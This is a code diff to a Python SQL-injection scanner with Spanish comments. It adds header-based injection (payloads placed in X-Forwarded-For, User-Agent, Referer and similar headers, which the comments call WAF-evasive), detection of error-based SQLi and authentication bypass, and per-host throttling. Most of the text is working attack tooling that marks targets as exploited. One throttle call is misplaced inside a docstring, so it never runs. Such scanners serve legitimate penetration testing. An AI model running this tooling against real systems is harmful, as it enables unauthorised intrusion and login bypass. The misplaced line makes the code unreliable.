@@ -12,6 +12,11 @@ import urllib3
 import threading
 import sys
 import os
+try:
+    from scanners.throttle import request_throttle
+except ImportError:
+    from throttle import request_throttle
+
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 from vulnerability_manager import vuln_manager
 try:
@@ -141,6 +146,17 @@ def _probe_accepts_json(base_url: str, headers: dict) -> bool:
 
 # Solo 401 como auth gate estricto (403 puede ser WAF/IP block, muy propenso a FP)
 _AUTH_GATE_STATUSES: frozenset = frozenset({401})
+
+# Headers inyectables para SQLi — vectores que los WAF suelen ignorar
+_SQLI_INJECTABLE_HEADERS: list = [
+    "X-Forwarded-For",
+    "X-Real-IP",
+    "User-Agent",
+    "Referer",
+    "X-Forwarded-Host",
+    "X-Client-IP",
+    "CF-Connecting-IP",
+]
 
 
 def _confirm_auth_bypass(base_url: str, param: str, payload: str,
@@ -300,7 +316,11 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
     sys.stdout.flush()
 
 
-    total_tasks = (len(urip) * 3 + len(urif) * 2) * len(wordlist)  # GET+POST+JSON (urip) + FORM+JSON (urif)
+    _unique_bases = len({urlparse(u).netloc + urlparse(u).path for u in urip + urif})
+    total_tasks = (
+        (len(urip) * 3 + len(urif) * 2) * len(wordlist)   # GET+POST+JSON / FORM+JSON
+        + _unique_bases * min(3, len(wordlist))             # Header injection
+    )
     current = 0
     lock = threading.Lock()
     vulnerable_endpoints = set()
@@ -339,6 +359,7 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
             return ""  # Cualquier otro error
 
     def test_url(url, payload):
+        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
         nonlocal current
         parsed = urlparse(url)
         base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
@@ -461,6 +482,7 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
             update_progress(current, total_tasks)
 
     def test_post(url, payload):
+        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
         nonlocal current
         parsed = urlparse(url)
         base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
@@ -593,6 +615,7 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
             update_progress(current, total_tasks)
 
     def test_form(url, payload):
+        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
         nonlocal current
         try:
             # Cache de formularios para evitar re-parsing
@@ -703,6 +726,7 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
 
     def test_json_body(url, payload):
         """Prueba inyección SQL en el body JSON (POST con Content-Type: application/json).
+        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
         Soporta endpoints con query params en URL Y endpoints JSON-only sin params (ej: POST /api/login)."""
         nonlocal current
         parsed = urlparse(url)
@@ -883,6 +907,91 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
             current += 1
             update_progress(current, total_tasks)
 
+    def test_headers_sqli(url, payload):
+        """Prueba SQLi inyectando el payload en headers HTTP (X-Forwarded-For, User-Agent, etc.)."""
+        request_throttle(__import__("urllib.parse", fromlist=["urlparse"]).urlparse(url).netloc)
+        nonlocal current
+        parsed = urlparse(url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+        if _is_static_path(url) or vuln_manager.should_skip_url(base_url, base_url_only=True):
+            with lock:
+                current += 1
+                update_progress(current, total_tasks)
+            return
+
+        if ban.is_banned(parsed.netloc):
+            with lock:
+                current += 1
+                update_progress(current, total_tasks)
+            return
+
+        base_headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
+
+        for hdr in _SQLI_INJECTABLE_HEADERS:
+            if vuln_manager.should_skip_url(base_url, base_url_only=True):
+                break
+            try:
+                # Baseline con valor benigno en el header
+                benign_h = dict(base_headers)
+                benign_h[hdr] = "TEST123"
+                rb = requests.get(base_url, headers=benign_h, verify=False, timeout=5)
+                baseline_text = rb.text.lower() if rb.status_code < 500 else ""
+                baseline_st = rb.status_code
+
+                # Payload en el header
+                injected_h = dict(base_headers)
+                injected_h[hdr] = payload
+                r = requests.get(base_url, headers=injected_h, verify=False, timeout=5)
+                ban.record(parsed.netloc, r.status_code, r, base_url)
+
+                if r.text.lower() == baseline_text:
+                    continue
+
+                # Capa 1: error SQL en respuesta
+                if r.status_code in (200, 500) and is_sqli_error_response(r.text):
+                    with lock:
+                        if base_url in vulnerable_endpoints:
+                            break
+                        vulnerable_endpoints.add(base_url)
+                    vuln_manager.mark_as_exploited(base_url, base_url_only=True)
+                    with stdout_lock:
+                        print_vulnerability(
+                            f"\033[1;32m[HEADER-SQLi][ERROR-BASED]\033[0m "
+                            f"{base_url} \033[2m(header: {hdr})\033[0m"
+                        )
+                    urls_vulnerables.append(
+                        f"{base_url}?__header_{hdr}__={quote(payload, safe='')}|||BYPASS_TECHNIQUE:HEADER-ERROR-BASED"
+                    )
+                    break
+
+                # Capa 2: auth bypass via header (raro pero existe en proxies)
+                if r.status_code == 200 and baseline_st in _AUTH_GATE_STATUSES:
+                    def _send_hdr(u, p, v, h):
+                        ih = dict(h); ih[p] = v
+                        return requests.get(u, headers=ih, verify=False, timeout=5)
+                    if _confirm_auth_bypass(base_url, hdr, payload, _send_hdr, injected_h):
+                        with lock:
+                            if base_url in vulnerable_endpoints:
+                                break
+                            vulnerable_endpoints.add(base_url)
+                        vuln_manager.mark_as_exploited(base_url, base_url_only=True)
+                        with stdout_lock:
+                            print_vulnerability(
+                                f"\033[1;32m[HEADER-SQLi][AUTH-BYPASS]\033[0m "
+                                f"{base_url} \033[2m(header: {hdr})\033[0m"
+                            )
+                        urls_vulnerables.append(
+                            f"{base_url}?__header_{hdr}__={quote(payload, safe='')}|||BYPASS_TECHNIQUE:HEADER-AUTH-BYPASS"
+                        )
+                        break
+            except Exception:
+                continue
+
+        with lock:
+            current += 1
+            update_progress(current, total_tasks)
+
     # No materializar millones de tareas/futures: agota RAM y el kernel mata el proceso (zsh: killed).
     pending_max = max(threads * 200, 2000)
 
@@ -910,6 +1019,18 @@ def sqli(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, r
                 if len(pending) >= pending_max:
                     drain_batch(pending)
                     pending.clear()
+        # Header injection: solo top-3 payloads en todos los dominios únicos para no sobrecargar
+        seen_bases = set()
+        for url in urip + urif:
+            parsed_h = urlparse(url)
+            base_h = f"{parsed_h.scheme}://{parsed_h.netloc}{parsed_h.path}"
+            if base_h not in seen_bases:
+                seen_bases.add(base_h)
+                for payload in wordlist[:3]:
+                    pending.append(executor.submit(test_headers_sqli, url, payload))
+                    if len(pending) >= pending_max:
+                        drain_batch(pending)
+                        pending.clear()
         if pending:
             drain_batch(pending)
     
